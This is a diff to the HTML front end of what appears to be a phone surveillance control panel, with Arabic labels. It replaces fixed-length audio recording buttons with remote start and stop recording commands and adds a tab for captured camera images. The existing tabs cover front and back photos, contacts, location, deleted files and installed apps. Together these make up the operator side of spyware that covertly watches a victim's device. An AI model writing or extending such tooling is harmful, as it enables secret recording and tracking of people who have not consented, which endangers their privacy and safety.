@@ -34,8 +34,8 @@
         <div class="camera-controls">
             <button onclick="sendCommand('take_photo_front')" class="camera-btn">📸 صورة أمامية</button>
             <button onclick="sendCommand('take_photo_back')" class="camera-btn">📸 صورة خلفية</button>
-            <button onclick="sendCommand('record_audio_30')" class="camera-btn">🎙️ تسجيل 30ث</button>
-            <button onclick="sendCommand('record_audio_60')" class="camera-btn">🎙️ تسجيل 60ث</button>
+            <button onclick="sendCommand('start_audio_recording')" class="camera-btn">🎙️ بدء تسجيل</button>
+            <button onclick="sendCommand('stop_audio_recording')" class="camera-btn stop">⏹️ إيقاف تسجيل</button>
         </div>
         
         <div class="tabs">
@@ -44,6 +44,7 @@
             <button class="tab" onclick="switchTab('contacts')">👥 جهات الاتصال <span id="contactsCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('location')">📍 الموقع</button>
             <button class="tab" onclick="switchTab('images')">🖼️ الصور <span id="imagesCount" class="count"></span></button>
+            <button class="tab" onclick="switchTab('camera_images')">📸 الكاميرا <span id="cameraImagesCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('audio')">🎙️ الصوتيات <span id="audioCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('deleted')">🗑️ المحذوفات <span id="deletedCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('apps')">📱 التطبيقات <span id="appsCount" class="count"></span></button>
@@ -84,6 +85,10 @@
             <div id="imagesTab" class="tab-pane">
                 <h3>🖼️ الصور</h3>
                 <div id="imagesGrid" class="images-grid"></div>
+            </div>
+            <div id="camera_imagesTab" class="tab-pane">
+                <h3>📸 صور الكاميرا</h3>
+                <div id="cameraImagesGrid" class="images-grid"></div>
             </div>
             <div id="audioTab" class="tab-pane">
                 <h3>🎙️ الصوتيات</h3>
